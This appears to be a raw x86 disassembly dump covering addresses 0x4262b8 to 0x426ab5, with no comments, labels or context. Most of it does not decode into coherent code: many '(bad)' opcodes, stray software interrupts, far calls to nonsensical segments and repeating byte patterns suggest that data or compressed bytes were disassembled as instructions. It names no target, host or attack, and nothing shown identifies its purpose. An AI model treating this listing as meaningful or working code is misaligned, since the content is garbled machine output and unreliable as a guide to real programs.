  4262b8:	rcr    BYTE PTR [eax+eax*4],cl
  4262bb:	xchg   esi,eax
  4262bc:	int    0xed
  4262be:	int    0x76
  4262c0:	dec    esp
  4262c1:	adc    ch,ch
  4262c3:	cmp    eax,0x5b808081
  4262c8:	cwde   
  4262c9:	call   0x2f35:0x86214966
  4262d0:	push   es
  4262d1:	mov    ecx,0xcd80804a
  4262d6:	jbe    0x426308
  4262d8:	inc    cx
  4262da:	and    DWORD PTR [esi-0x62f9d0cb],eax
  4262e0:	dec    edx
  4262e1:	add    BYTE PTR [eax-0x29128937],0x37
  4262e8:	ficom  WORD PTR [ebx]
  4262ea:	pop    ebp
  4262eb:	mov    ebp,0xa25230a
  4262f0:	jbe    0x426303
  4262f2:	leave  
  4262f3:	jbe    0x4262aa
  4262f5:	xchg   ecx,eax
  4262f6:	aaa    
  4262f7:	ficom  WORD PTR [ebx]
  4262f9:	or     dh,BYTE PTR [esi-0x43]
  4262fc:	int    0x76
  4262fe:	mov    BYTE PTR [edx],cl
  426300:	jbe    0x4262f7
  426302:	int    0x76
  426304:	cmc    
  426305:	int    0x1
  426307:	mov    ebp,0xcd808081
  42630c:	or     ch,0x80
  42630f:	or     dh,BYTE PTR [esi-0x7]
  426312:	pop    edi
  426313:	jle    0x42634a
  426315:	add    BYTE PTR [eax-0x7fca69a3],0x80
  42631c:	mov    eax,0x4b0760a
  426321:	ins    DWORD PTR es:[edi],dx
  426322:	(bad)  
  426323:	mov    eax,0xcda2760a
  426328:	sar    DWORD PTR [eax+0x5d15760a],cl
  42632e:	(bad)  
  42632f:	xor    eax,0xf1cd8080
  426334:	mov    eax,0xcf19960a
  426339:	nop
  42633a:	xchg   edx,eax
  42633b:	iret   
  42633c:	sahf   
  42633d:	(bad)  
  42633e:	int    0x99
  426340:	mov    eax,0xcd1d960a
  426345:	aad    0xb8
  426347:	or     dl,BYTE PTR [esi-0x662dfbdf]
  42634d:	mov    eax,0xcf01960a
  426352:	jno    0x4263a8
  426354:	int    0x3
  426356:	mov    eax,0x40be60a
  42635b:	leave  
  42635c:	xchg   ebp,eax
  42635d:	mov    eax,0xcf05e60a
  426362:	ficomp WORD PTR [eax-0x48]
  426365:	or     ah,dh
  426367:	pop    es
  426368:	mov    eax,0xb809760a
  42636d:	or     dl,dh
  42636f:	retf   0xc5cd
  426372:	mov    eax,0xb8cc760a
  426377:	or     dl,BYTE PTR [edi]
  426379:	ins    BYTE PTR es:[edi],dx
  42637a:	add    BYTE PTR [eax],al
  42637c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426383:	push   edx
  426384:	add    BYTE PTR [eax],al
  426386:	add    bh,cl
  426388:	outs   dx,BYTE PTR ds:[esi]
  426389:	add    edi,DWORD PTR [eax+0x74060a]
  42638f:	add    BYTE PTR [eax],al
  426391:	add    al,0x6d
  426393:	inc    edx
  426394:	mov    eax,0x78060a
  426399:	add    BYTE PTR [eax],al
  42639b:	iret   
  42639c:	outs   dx,BYTE PTR ds:[esi]
  42639d:	xor    BYTE PTR [eax+0x7c060a],bh
  4263a3:	add    BYTE PTR [eax],al
  4263a5:	add    al,0x6d
  4263a7:	xor    bh,BYTE PTR [eax+0x8a060a]
  4263ad:	add    BYTE PTR [eax],al
  4263af:	mov    eax,0x8ccf0a
  4263b4:	add    BYTE PTR [eax],al
  4263b6:	int    0xc5
  4263b8:	mov    eax,0x8e060a
  4263bd:	add    BYTE PTR [eax],al
  4263bf:	int    0x76
  4263c1:	in     eax,dx
  4263c2:	int    0x8d
  4263c4:	adc    DWORD PTR [edi],ebp
  4263c6:	inc    ebp
  4263c7:	jge    0x42635b
  4263c9:	shr    ebx,cl
  4263cb:	xchg   edx,eax
  4263cc:	int    0x8d
  4263ce:	in     eax,dx
  4263cf:	int    0x96
  4263d1:	adc    ebx,eax
  4263d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263d4:	mov    esi,0xc93b4229
  4263d9:	cmp    ebx,edx
  4263db:	shl    edx,cl
  4263dd:	sub    BYTE PTR [ebx-0x2e],dl
  4263e0:	in     al,dx
  4263e1:	outs   dx,BYTE PTR ds:[esi]
  4263e2:	iret   
  4263e3:	aam    0x76
  4263e5:	mov    al,0xb8
  4263e7:	int    0x4e
  4263e9:	das    
  4263ea:	mov    ebx,0xcbbb2f18
  4263ef:	cmp    ecx,DWORD PTR [edx+edx*1]
  4263f2:	sti    
  4263f3:	and    DWORD PTR ds:0xf3e38080,esi
  4263f9:	shl    edx,cl
  4263fb:	das    
  4263fc:	push   ebx
  4263fd:	adc    ecx,DWORD PTR [ecx]
  4263ff:	int3   
  426400:	test   DWORD PTR [ebp-0x32ffff01],esp
  426406:	lea    esi,[ebp+0x2fbd96cd]
  42640c:	inc    ebp
  42640d:	jecxz  0x4263a1
  42640f:	shl    ebx,cl
  426411:	xchg   edx,eax
  426412:	int    0x96
  426414:	mov    ch,0xcd
  426416:	(bad)  
  426417:	mov    ebp,0xf73bf03b
  42641c:	push   ebx
  42641d:	psrlq  mm5,mm2
  426420:	sub    BYTE PTR [edi-0x7906fb2d],al
  426426:	(bad)  
  426427:	popa   
  426428:	int    0x76
  42642a:	in     eax,dx
  42642b:	int    0x8d
  42642d:	adc    DWORD PTR [edi],ebp
  42642f:	inc    ebp
  426430:	jge    0x4263c4
  426432:	shr    ebx,cl
  426434:	xchg   edx,eax
  426435:	int    0x8d
  426437:	in     eax,dx
  426438:	int    0x96
  42643a:	adc    DWORD PTR [ebx],edi
  42643c:	leave  
  42643d:	cmp    ebx,edx
  42643f:	shl    edx,cl
  426441:	sub    BYTE PTR [ebx-0x2e],dl
  426444:	in     al,dx
  426445:	outs   dx,BYTE PTR ds:[esi]
  426446:	iret   
  426447:	aam    0x76
  426449:	add    DWORD PTR [eax-0x44d0b133],edi
  42644f:	sbb    BYTE PTR [edi],ch
  426451:	mov    ebx,0x120c3bcb
  426456:	sti    
  426457:	and    DWORD PTR ds:0xf3e38080,esi
  42645d:	shl    edx,cl
  42645f:	das    
  426460:	push   ebx
  426461:	adc    ecx,DWORD PTR [ecx]
  426463:	int3   
  426464:	test   esp,ecx
  426466:	inc    DWORD PTR [eax]
  426468:	add    ch,cl
  42646a:	lea    esi,[ebp+0x2fbd96cd]
  426470:	inc    ebp
  426471:	jecxz  0x426405
  426473:	shl    ebx,cl
  426475:	xchg   edx,eax
  426476:	int    0x96
  426478:	mov    ch,0xcd
  42647a:	(bad)  
  42647b:	mov    ebp,0xf73bf03b
  426480:	push   ebx
  426481:	psrlq  mm5,mm2
  426484:	sub    BYTE PTR [edi-0x7406fb2d],al
  42648a:	(bad)  
  42648b:	popa   
  42648c:	int    0x76
  42648e:	in     eax,dx
  42648f:	int    0x8d
  426491:	adc    DWORD PTR [edi],ebp
  426493:	inc    ebp
  426494:	jge    0x426428
  426496:	shr    ebx,cl
  426498:	xchg   edx,eax
  426499:	int    0x8d
  42649b:	in     eax,dx
  42649c:	int    0x96
  42649e:	adc    DWORD PTR [ebx],edi
  4264a0:	leave  
  4264a1:	cmp    ebx,edx
  4264a3:	shl    edx,cl
  4264a5:	sub    BYTE PTR [ebx-0x2e],dl
  4264a8:	in     al,dx
  4264a9:	je     0x42647a
  4264ab:	push   ebp
  4264ac:	jbe    0x42651a
  4264ae:	add    BYTE PTR [eax],al
  4264b0:	add    BYTE PTR [eax-0x44d0b133],bh
  4264b6:	sbb    BYTE PTR [edi],ch
  4264b8:	mov    ebx,0x120c3bcb
  4264bd:	sti    
  4264be:	and    DWORD PTR ds:0xf3e38080,esi
  4264c4:	shl    edx,cl
  4264c6:	das    
  4264c7:	push   ebx
  4264c8:	adc    ecx,DWORD PTR [ecx]
  4264ca:	int3   
  4264cb:	test   DWORD PTR ds:0xcd0000ff,eax
  4264d1:	lea    esi,[ebp+0x2fbd96cd]
  4264d7:	inc    ebp
  4264d8:	jecxz  0x42646c
  4264da:	shl    ebx,cl
  4264dc:	xchg   edx,eax
  4264dd:	int    0x96
  4264df:	mov    ch,0xcd
  4264e1:	(bad)  
  4264e2:	mov    ebp,0xf73bf03b
  4264e7:	push   ebx
  4264e8:	psrlq  mm5,mm2
  4264eb:	sub    BYTE PTR [edi-0x7706fb2d],al
  4264f1:	(bad)  
  4264f2:	mov    ebx,0xffb506cf
  4264f7:	add    BYTE PTR [eax],al
  4264f9:	or     dh,BYTE PTR [esi-0x7]
  4264fc:	int    0x76
  4264fe:	stc    
  4264ff:	pop    edi
  426500:	inc    esi
  426501:	pop    esp
  426502:	inc    ebp
  426503:	xchg   edi,eax
  426504:	or     cl,BYTE PTR [eax+0x79245161]
  42650a:	daa    
  42650b:	or     dh,BYTE PTR [eax-0x7c]
  42650e:	int    0x6
  426510:	mov    ch,0xff
  426512:	add    BYTE PTR [eax],al
  426514:	int    0x57
  426516:	mov    ebp,0xa0000ff
  42651b:	(bad)  
  42651c:	mov    ebp,0x8621d169
  426521:	xor    eax,0x62fd343
  426526:	pusha  
  426527:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  426531:	add    BYTE PTR [eax-0x7fca76a3],0x80
  426538:	mov    eax,0xfff9060a
  42653d:	add    BYTE PTR [eax],al
  42653f:	int    0xc5
  426541:	mov    eax,0xff03060a
  426546:	add    BYTE PTR [eax],al
  426548:	pop    ebp
  426549:	es xor eax,0xab88080
  42654f:	push   es
  426550:	std    
  426551:	inc    DWORD PTR [eax]
  426553:	add    BYTE PTR [ebp-0x5d],bl
  426556:	xor    eax,0xab88080
  42655b:	push   es
  42655c:	(bad)  
  42655d:	inc    DWORD PTR [eax]
  42655f:	add    BYTE PTR [ebp+0x1e],bl
  426562:	xor    eax,0xab88080
  426567:	push   es
  426568:	add    BYTE PTR [eax],0x0
  42656b:	add    BYTE PTR [ebp*2-0x47823218],al
  426572:	or     cl,bh
  426574:	xchg   edx,eax
  426575:	add    BYTE PTR [eax],al
  426577:	add    ch,cl
  426579:	jbe    0x4265ab
  42657b:	pop    edi
  42657c:	dec    ebx
  42657d:	xor    eax,0xab88080
  426582:	iret   
  426583:	test   BYTE PTR [eax],al
  426585:	add    BYTE PTR [eax],al
  426587:	add    al,0xd3
  426589:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42658f:	add    BYTE PTR [eax],al
  426591:	pop    edi
  426592:	push   esi
  426593:	xor    eax,0xab88080
  426598:	iret   
  426599:	mov    BYTE PTR [eax],al
  42659b:	add    BYTE PTR [eax],al
  42659d:	add    al,0xd3
  42659f:	pushf  
  4265a0:	mov    eax,0x4acf0a
  4265a5:	add    BYTE PTR [eax],al
  4265a7:	int    0xc
  4265a9:	mov    eax,0x4ccf0a
  4265ae:	add    BYTE PTR [eax],al
  4265b0:	pop    edi
  4265b1:	add    al,0x35
  4265b3:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  4265ba:	add    BYTE PTR [eax],al
  4265bc:	cmp    edi,DWORD PTR [ecx+0x5f]
  4265bf:	adc    DWORD PTR [eax-0x80],edx
  4265c2:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  4265c9:	add    bl,dl
  4265cb:	mov    ebp,0x151a5f92
  4265d0:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  4265d7:	add    BYTE PTR [eax],al
  4265d9:	pop    edi
  4265da:	call   0xcf0a:0xb88080eb
  4265e1:	adc    al,0x0
  4265e3:	add    BYTE PTR [eax],al
  4265e5:	int    0x8d
  4265e7:	xor    BYTE PTR [edx+eax*1],al
  4265ea:	call   ebx
  4265ec:	repnz sub BYTE PTR [ebx-0x2d],dl
  4265f0:	or     al,BYTE PTR [esi]
  4265f2:	adc    eax,0xcd0000ff
  4265f7:	jbe    0x426645
  4265f9:	int    0x8d
  4265fb:	dec    esp
  4265fc:	cmp    edi,DWORD PTR [ecx-0x2d]
  4265ff:	mov    ebp,0xff020492
  426604:	shl    edx,cl
  426606:	sub    BYTE PTR [ebx-0x2d],dl
  426609:	leave  
  42660a:	add    eax,0xff1d06
  42660f:	add    BYTE PTR [eax],al
  426611:	add    BYTE PTR [eax+0x1506cf80],al
  426617:	inc    DWORD PTR [eax]
  426619:	add    BYTE PTR [eax-0x33],dh
  42661c:	jbe    0x42664e
  42661e:	int    0x8d
  426620:	xor    BYTE PTR [ebx],bh
  426622:	jns    0x4265f7
  426624:	mov    ebp,0xff020492
  426629:	shl    edx,cl
  42662b:	sub    BYTE PTR [ebx-0x2d],dl
  42662e:	jo     0x4265ff
  426630:	push   es
  426631:	stc    
  426632:	inc    DWORD PTR [eax]
  426634:	add    BYTE PTR [eax-0x33],dh
  426637:	jbe    0x42662e
  426639:	int    0x1
  42663b:	cmp    eax,0xc9808081
  426640:	push   es
  426641:	sbb    BYTE PTR [eax],al
  426643:	add    BYTE PTR [eax],al
  426645:	inc    eax
  426646:	retf   
  426647:	fwait
  426648:	xor    eax,0x76cd5000
  42664d:	adc    al,0x0
  42664f:	icebp  
  426650:	or     dh,BYTE PTR [esi-0x7]
  426653:	int    0x76
  426655:	stc    
  426656:	push   es
  426657:	ins    DWORD PTR es:[edi],dx
  426658:	aam    0x4a
  42665a:	adc    dl,BYTE PTR [esi+0x68]
  42665d:	or     BYTE PTR [ebx+ecx*1],bl
  426660:	fmul   QWORD PTR [ebx-0x17]
  426663:	(bad)  
  426664:	int    0x8d
  426666:	dec    esp
  426667:	int    0x96
  426669:	dec    esp
  42666a:	sar    bh,0x3b
  42666d:	setl   BYTE PTR [ebx]
  426670:	icebp  
  426671:	shr    edx,cl
  426673:	sub    bl,dl
  426675:	jmp    0x426609
  426677:	push   ebx
  426678:	adc    ecx,ebp
  42667a:	xchg   esi,eax
  42667b:	cmc    
  42667c:	int    0xa2
  42667e:	and    eax,0x5e808081
  426683:	dec    edx
  426684:	das    
  426685:	push   es
  426686:	popa   
  426687:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42668d:	int    0x96
  42668f:	dec    esp
  426690:	cmp    ecx,DWORD PTR [edi]
  426692:	shr    ebx,cl
  426694:	xchg   edx,eax
  426695:	cmp    esi,ecx
  426697:	shr    edx,cl
  426699:	sub    BYTE PTR [ebx+0x13],dl
  42669c:	int    0x96
  42669e:	cmc    
  42669f:	int    0xa2
  4266a1:	in     al,0x81
  4266a3:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  4266aa:	int    0x96
  4266ac:	dec    esp
  4266ad:	cmp    ecx,DWORD PTR [edi]
  4266af:	shr    ebx,cl
  4266b1:	xchg   edx,eax
  4266b2:	cmp    esi,ecx
  4266b4:	shr    edx,cl
  4266b6:	sub    BYTE PTR [ebx+0x13],dl
  4266b9:	int    0x96
  4266bb:	cmc    
  4266bc:	int    0xa2
  4266be:	add    DWORD PTR [ecx+0x4a0a8080],eax
  4266c4:	pop    edi
  4266c5:	xor    ax,0x8080
  4266c9:	mov    eax,0x24cf0a
  4266ce:	add    BYTE PTR [eax],al
  4266d0:	int    0xc
  4266d2:	mov    eax,0x28cf0a
  4266d7:	add    BYTE PTR [eax],al
  4266d9:	pop    edi
  4266da:	es xor eax,0xab88080
  4266e0:	iret   
  4266e1:	sub    al,0x0
  4266e3:	add    BYTE PTR [eax],al
  4266e5:	pop    edi
  4266e6:	daa    
  4266e7:	xor    eax,0xab88080
  4266ec:	iret   
  4266ed:	xor    al,BYTE PTR [eax]
  4266ef:	add    BYTE PTR [eax],al
  4266f1:	add    al,0xd3
  4266f3:	test   eax,0x34cf0ab8
  4266f8:	add    BYTE PTR [eax],al
  4266fa:	add    BYTE PTR [edi-0x69],bl
  4266fd:	xor    eax,0xab88080
  426702:	iret   
  426703:	cmp    BYTE PTR [eax],al
  426705:	add    BYTE PTR [eax],al
  426707:	add    al,0xd3
  426709:	mov    dl,0xb8
  42670b:	or     cl,bh
  42670d:	cmp    al,0x0
  42670f:	add    BYTE PTR [eax],al
  426711:	pop    edi
  426712:	fwait
  426713:	xor    eax,0xab88080
  426718:	iret   
  426719:	inc    eax
  42671a:	add    BYTE PTR [eax],al
  42671c:	add    ch,cl
  42671e:	or     al,0xb8
  426720:	or     cl,bh
  426722:	inc    esp
  426723:	add    BYTE PTR [eax],al
  426725:	add    BYTE PTR [edi+0x17],bl
  426728:	xor    eax,0xab88080
  42672d:	iret   
  42672e:	dec    eax
  42672f:	add    BYTE PTR [eax],al
  426731:	add    BYTE PTR [edi+0x26],bl
  426734:	pop    esi
  426735:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  42673c:	add    BYTE PTR [eax],al
  42673e:	pop    edi
  42673f:	cmp    esi,DWORD PTR [edx]
  426741:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  426748:	add    BYTE PTR [eax],al
  42674a:	jns    0x4267c2
  42674c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42674d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42674e:	pop    edi
  42674f:	pop    esp
  426750:	adc    eax,0xab88080
  426755:	iret   
  426756:	push   esp
  426757:	add    BYTE PTR [eax],al
  426759:	add    BYTE PTR [ebx+edx*8],al
  42675c:	pop    esp
  42675d:	mov    eax,0x58cf0a
  426762:	add    BYTE PTR [eax],al
  426764:	jns    0x4267dc
  426766:	fisttp WORD PTR [ecx+0x79]
  426769:	jbe    0x426714
  42676b:	inc    ecx
  42676c:	jns    0x4267e4
  42676e:	loope  0x426713
  426770:	pop    edi
  426771:	fcom   st(4)
  426773:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42677a:	add    BYTE PTR [eax],al
  42677c:	jns    0x4267f4
  42677e:	lods   eax,DWORD PTR ds:[esi]
  42677f:	push   edi
  426780:	pop    edi
  426781:	jnp    0x4267d8
  426783:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42678a:	add    BYTE PTR [eax],al
  42678c:	jns    0x426804
  42678e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426792:	jmp    0x8080:0x35a15f47
  426799:	mov    eax,0x64cf0a
  42679e:	add    BYTE PTR [eax],al
  4267a0:	jns    0x426818
  4267a2:	in     eax,0x18
  4267a4:	int    0x8d
  4267a6:	xor    ch,cl
  4267a8:	xchg   esi,eax
  4267a9:	xor    BYTE PTR [ebx],bh
  4267ab:	(bad)  
  4267ad:	icebp  
  4267ae:	shr    ebx,cl
  4267b0:	xchg   edx,eax
  4267b1:	shr    edx,cl
  4267b3:	sub    BYTE PTR [ebx+0x13],dl
  4267b6:	in     al,dx
  4267b7:	xchg   esp,eax
  4267b8:	int    0x96
  4267ba:	xor    ch,cl
  4267bc:	out    0x30,al
  4267be:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267c4:	stc    
  4267c5:	shr    ecx,cl
  4267c7:	sub    BYTE PTR [ebx-0x27],dl
  4267ca:	xor    edx,DWORD PTR [ebx]
  4267cc:	das    
  4267cd:	pop    ecx
  4267ce:	mov    WORD PTR [ebp-0x5b],cs
  4267d1:	int    0x96
  4267d3:	xor    ch,cl
  4267d5:	out    0x30,al
  4267d7:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267dd:	stc    
  4267de:	shr    ecx,cl
  4267e0:	sub    BYTE PTR [ebx-0x27],dl
  4267e3:	int    0xe6
  4267e5:	stc    
  4267e6:	add    al,0x2
  4267e8:	adc    DWORD PTR [edx],0xffffffd3
  4267eb:	fwait
  4267ec:	add    BYTE PTR [eax+0x9033380],0x8c
  4267f3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4267f5:	int    0x96
  4267f7:	xor    ch,cl
  4267f9:	lea    esi,[eax]
  4267fb:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  426801:	sub    bl,dl
  426803:	repz xchg edx,eax
  426805:	push   ebx
  426806:	jecxz  0x4267d5
  426808:	(bad)  
  426809:	stc    
  42680a:	xchg   DWORD PTR [ebx],edx
  42680c:	int    0x96
  42680e:	xor    ch,cl
  426810:	out    0x30,al
  426812:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  426818:	xchg   edx,eax
  426819:	shr    ecx,cl
  42681b:	sub    BYTE PTR [ebx-0x27],dl
  42681e:	add    al,0xd2
  426820:	mov    BYTE PTR [edx],cl
  426822:	(bad)  
  426823:	stc    
  426824:	inc    ebx
  426825:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  42682b:	int    0x96
  42682d:	xor    BYTE PTR [ebx],bh
  42682f:	(bad)  
  426831:	icebp  
  426832:	shr    ebx,cl
  426834:	xchg   edx,eax
  426835:	shr    edx,cl
  426837:	sub    BYTE PTR [ebx+0x13],dl
  42683a:	or     cl,bh
  42683c:	adc    eax,0xcd0000ff
  426841:	lea    ecx,[ebp+ecx*8-0x6a]
  426845:	dec    esp
  426846:	cmp    ecx,DWORD PTR [edi]
  426848:	cmp    esi,ecx
  42684a:	shr    edx,cl
  42684c:	sub    bl,dl
  42684e:	jmp    0x4267e2
  426850:	push   ebx
  426851:	adc    ecx,edi
  426853:	xchg   esi,eax
  426854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426855:	or     dl,BYTE PTR ds:0xff1dcf
  42685b:	add    BYTE PTR [ecx+0x6b],ah
  42685e:	xor    eax,0x13cd8080
  426863:	mov    eax,0x4258d0a
  426868:	rcl    edx,cl
  42686a:	int    0xfa
  42686c:	mov    eax,0xcf29e60a
  426871:	loopne 0x42681c
  426873:	mov    eax,0x42de60a
  426878:	leave  
  426879:	test   BYTE PTR [eax-0x304d19f6],bh
  42687f:	loopne 0x426895
  426881:	mov    eax,0x435e60a
  426886:	leave  
  426887:	loop   0x426841
  426889:	or     ah,dh
  42688b:	cmp    ebp,ecx
  42688d:	cli    
  42688e:	mov    eax,0xcd3de60a
  426893:	add    edi,DWORD PTR [eax-0x32be19f6]
  426899:	cld    
  42689a:	mov    eax,0xcd45e60a
  42689f:	add    edi,DWORD PTR [eax-0x322f19f6]
  4268a5:	cli    
  4268a6:	mov    eax,0xcfc2e60a
  4268ab:	loopne 0x4268d6
  4268ad:	mov    eax,0x455e60a
  4268b2:	leave  
  4268b3:	test   BYTE PTR [eax-0x30a619f6],bh
  4268b9:	loopne 0x426850
  4268bb:	mov    eax,0x45de60a
  4268c0:	leave  
  4268c1:	loop   0x42687b
  4268c3:	or     ah,dh
  4268c5:	popa   
  4268c6:	mov    eax,0xb8658d0a
  4268cb:	or     dl,BYTE PTR [esi-0x47f33297]
  4268d1:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  4268d7:	int    0x96
  4268d9:	dec    esp
  4268da:	cmp    esi,ecx
  4268dc:	cmp    ecx,DWORD PTR [edi]
  4268de:	shr    edx,cl
  4268e0:	sub    bl,dl
  4268e2:	jmp    0x426876
  4268e4:	push   ebx
  4268e5:	adc    ecx,ebp
  4268e7:	xchg   esi,eax
  4268e8:	dec    esp
  4268e9:	int    0xe6
  4268eb:	dec    esp
  4268ec:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  4268f2:	mov    WORD PTR [ebp-0x2c06c430],cs
  4268f8:	jmp    0x301bbc25
  4268fd:	mov    ebx,0xb8d93b5e
  426902:	or     dh,BYTE PTR [ecx]
  426904:	int    0x8d
  426906:	dec    esp
  426907:	int    0x96
  426909:	dec    esp
  42690a:	cmp    ecx,DWORD PTR [edi]
  42690c:	cmp    esi,ecx
  42690e:	shr    ebx,cl
  426910:	xchg   edx,eax
  426911:	shr    edx,cl
  426913:	sub    BYTE PTR [ebx+0x13],dl
  426916:	int    0x96
  426918:	dec    esp
  426919:	iret   
  42691a:	mov    WORD PTR [ebp-0x3266c4db],cs
  426920:	out    0x4c,al
  426922:	shl    ebx,cl
  426924:	xchg   edx,eax
  426925:	cmp    edi,ecx
  426927:	shr    ecx,cl
  426929:	sub    BYTE PTR [ebx-0x27],dl
  42692c:	das    
  42692d:	mov    ebx,0xb8d93b5e
  426932:	or     dh,BYTE PTR [ecx]
  426934:	int    0x8d
  426936:	dec    esp
  426937:	int    0x96
  426939:	dec    esp
  42693a:	cmp    esi,ecx
  42693c:	shr    edx,cl
  42693e:	sub    BYTE PTR [ebx],bh
  426940:	psrlq  mm5,mm3
  426943:	xchg   edx,eax
  426944:	push   ebx
  426945:	adc    ecx,ebp
  426947:	xchg   esi,eax
  426948:	dec    esp
  426949:	int    0xe6
  42694b:	dec    esp
  42694c:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426952:	stc    
  426953:	shr    ecx,cl
  426955:	sub    BYTE PTR [ebx-0x27],dl
  426958:	mov    eax,0x9096cc0a
  42695d:	inc    DWORD PTR [eax]
  42695f:	add    ch,cl
  426961:	lea    ecx,[ebp+ecx*8-0x6a]
  426965:	dec    esp
  426966:	cmp    esi,ecx
  426968:	shr    edx,cl
  42696a:	sub    BYTE PTR [ebx],bh
  42696c:	psrlq  mm5,mm3
  42696f:	xchg   edx,eax
  426970:	push   ebx
  426971:	adc    ecx,ebp
  426973:	xchg   esi,eax
  426974:	dec    esp
  426975:	int    0xe6
  426977:	dec    esp
  426978:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42697e:	stc    
  42697f:	shr    ecx,cl
  426981:	sub    BYTE PTR [ebx-0x27],dl
  426984:	mov    eax,0xa496cc0a
  426989:	inc    DWORD PTR [eax]
  42698b:	add    ch,cl
  42698d:	lea    esi,[eax]
  42698f:	int    0x96
  426991:	xor    BYTE PTR [ebx],bh
  426993:	icebp  
  426994:	cmp    ecx,DWORD PTR [edi]
  426996:	shr    edx,cl
  426998:	sub    bl,dl
  42699a:	jmp    0x42692e
  42699c:	push   ebx
  42699d:	adc    ecx,ebp
  42699f:	xchg   esi,eax
  4269a0:	xor    ch,cl
  4269a2:	out    0x30,al
  4269a4:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4269aa:	xchg   edx,eax
  4269ab:	shr    ecx,cl
  4269ad:	sub    BYTE PTR [ebx-0x27],dl
  4269b0:	xchg   DWORD PTR [ebx],edx
  4269b2:	or     cl,bh
  4269b4:	adc    eax,0xcd0000ff
  4269b9:	lea    ecx,[ebp+ecx*8-0x6a]
  4269bd:	dec    esp
  4269be:	int    0xe6
  4269c0:	mov    BYTE PTR [ebx],bh
  4269c2:	icebp  
  4269c3:	cmp    ecx,DWORD PTR [edi]
  4269c5:	shr    ebx,cl
  4269c7:	xchg   edx,eax
  4269c8:	shr    edx,cl
  4269ca:	sub    BYTE PTR [ebx+0x13],dl
  4269cd:	iret   
  4269ce:	push   es
  4269cf:	nop
  4269d0:	inc    DWORD PTR [eax]
  4269d2:	add    BYTE PTR [edx],cl
  4269d4:	add    eax,0xff1dcf
  4269d9:	add    bh,cl
  4269db:	jbe    0x4269ad
  4269dd:	mov    ebp,0x10d8
  4269e2:	int    0x8d
  4269e4:	xor    ch,cl
  4269e6:	xchg   esi,eax
  4269e7:	xor    al,al
  4269e9:	(bad)  
  4269ea:	cmp    ecx,DWORD PTR [edi]
  4269ec:	stos   BYTE PTR es:[edi],al
  4269ed:	cmp    ebx,ecx
  4269ef:	shr    ebx,cl
  4269f1:	xchg   edx,eax
  4269f2:	shr    edx,cl
  4269f4:	sub    BYTE PTR [ebx+0x13],dl
  4269f7:	or     al,BYTE PTR ds:0xff1dcf
  4269fd:	add    ch,cl
  4269ff:	jbe    0x426a4d
  426a01:	int    0x8d
  426a03:	dec    esp
  426a04:	cmp    edi,DWORD PTR [ecx-0x2d]
  426a07:	mov    ebp,0xd3f03b92
  426a0c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426a10:	aam    0x3c
  426a12:	iret   
  426a13:	push   es
  426a14:	adc    eax,0x700000ff
  426a19:	int    0x76
  426a1b:	xor    ch,cl
  426a1d:	lea    esi,[eax]
  426a1f:	cmp    edi,DWORD PTR [ecx-0x2d]
  426a22:	mov    ebp,0xd3f03b92
  426a27:	repnz sub BYTE PTR [ebx-0x2d],dl
  426a2b:	jo     0x4269fc
  426a2d:	push   es
  426a2e:	and    al,0x0
  426a30:	add    BYTE PTR [eax],al
  426a32:	jo     0x426a01
  426a34:	jbe    0x426a4a
  426a36:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  426a3d:	int    0x8d
  426a3f:	dec    esp
  426a40:	cmp    edi,DWORD PTR [ecx+0x3b]
  426a43:	lock int 0xe6
  426a46:	mov    bl,dl
  426a48:	mov    ebp,0x28f2d392
  426a4d:	push   ebx
  426a4e:	ror    edi,cl
  426a50:	iret   
  426a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a52:	inc    DWORD PTR [eax]
  426a54:	add    BYTE PTR [edx],cl
  426a56:	int3   
  426a57:	push   es
  426a58:	sbb    eax,0xcf0000ff
  426a5d:	jbe    0x426a84
  426a5f:	mov    ebp,0xeff5
  426a64:	int    0x8d
  426a66:	xor    ch,cl
  426a68:	xchg   esi,eax
  426a69:	xor    BYTE PTR [ebx],bh
  426a6b:	psrlq  mm5,mm3
  426a6e:	xchg   edx,eax
  426a6f:	add    al,0xfb
  426a71:	call   ebx
  426a73:	jmp    0xcf05:0xa135328
  426a7a:	sbb    eax,0x610000ff
  426a7f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a85:	xor    eax,0xab88080
  426a8a:	push   es
  426a8b:	jo     0x426a8d
  426a8d:	add    BYTE PTR [eax],al
  426a8f:	iret   
  426a90:	mov    dh,BYTE PTR [eax]
  426a92:	mov    eax,0xb4cf0a
  426a97:	add    BYTE PTR [eax],al
  426a99:	pop    ebp
  426a9a:	adc    BYTE PTR ds:0xab88080,dh
  426aa0:	push   es
  426aa1:	bound  eax,QWORD PTR [eax]
  426aa3:	add    BYTE PTR [eax],al
  426aa5:	int    0xd2
  426aa7:	mov    eax,0x94060a
  426aac:	add    BYTE PTR [eax],al
  426aae:	int    0xd3
  426ab0:	mov    eax,0x98060a
  426ab5:	add    BYTE PTR [eax],al
